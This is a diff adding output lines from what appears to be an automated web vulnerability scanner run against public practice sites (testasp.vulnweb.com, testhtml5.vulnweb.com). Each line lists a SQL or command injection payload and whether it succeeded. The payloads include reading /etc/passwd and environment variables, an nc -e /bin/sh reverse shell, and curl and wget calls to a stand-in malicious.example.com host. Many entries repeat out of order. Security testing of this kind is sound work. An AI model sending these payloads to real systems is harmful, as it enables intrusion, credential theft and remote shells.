@@ -2264,3 +2264,1470 @@ URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection,
 URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
 URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
 URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
+URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
+URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(uname -a), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `uname -a`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || id, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `id`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(id), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || pwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `pwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(pwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ps aux, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || sleep 10, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ping -c 4 127.0.0.1, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || /bin/sh, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -e /bin/sh 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || curl http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || wget http://malicious.example.com, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nmap localhost, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || netstat -an, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || arp -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || touch /tmp/vulnerable, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || whoami, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: || cat /etc/passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: `cat /etc/passwd`, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: $(cat /etc/passwd), Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: && ls, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: ; uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
+URL: http://testasp.vulnweb.com/, Payload: | uname -a, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
